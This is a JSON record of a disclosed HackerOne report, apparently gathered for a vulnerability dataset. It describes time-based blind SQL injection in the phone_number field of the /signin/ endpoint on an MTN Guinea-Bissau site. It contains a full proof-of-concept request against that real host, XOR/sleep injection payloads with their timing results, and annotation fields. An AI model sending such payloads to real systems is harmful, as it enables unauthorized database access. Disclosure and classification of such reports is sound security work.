{
  "reported_to": "MTN Group",
  "reported_by": "pisarenko ",
  "title": "SQL injection [futexpert.mtngbissau.com]",
  "content": "\nSummary:\n[add summary of the vulnerability]\nSteps To Reproduce:\n[add details for how we can reproduce the issue]\nPoc Request\nPOST /signin/ HTTP/1.1 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: https://futexpert.mtngbissau.com/ Cookie: PHPSESSID=sn56alvthfp0l0vvoku34jd2i4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Content-Length: 82 Host: futexpert.mtngbissau.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive\nphone_number=0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z&pin=1&submit=Continuar\nTests performed:\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.438\n0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.394\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.391\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.396\n0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.802\n0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.436\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.435\nImpact\nsql\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1631202000,
  "report_url": "https://hackerone.com/reports/924855",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a POST request to /signin/ with the payload containing SQL injection in the 'phone_number' parameter."
    ],
    [
      2,
      "Observe the response time to confirm the SQL injection vulnerability based on the sleep commands in the payload."
    ]
  ],
  "vuln_description": "The vulnerability is a SQL injection in the 'phone_number' parameter of the /signin/ endpoint. The attacker can manipulate the SQL query by injecting malicious SQL code, which can lead to unauthorized access to the database or other malicious activities.",
  "reason": "The attack involves a straightforward SQL injection technique with no need for complex interactions or state manipulations. The payload is simple and directly exploits the vulnerable parameter.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves injecting malicious SQL queries through the phone_number parameter in the POST request to /signin/. This is a classic example of an injection vulnerability where the application does not properly sanitize user input before using it in a SQL query. The methodology described focuses on authentication and authorization bypasses (AuthN/AuthZ) and IDOR vulnerabilities, which are different from injection vulnerabilities. The SQL injection is not about bypassing authorization boundaries but about manipulating the database query itself.",
    "is_detectable": false
  }
}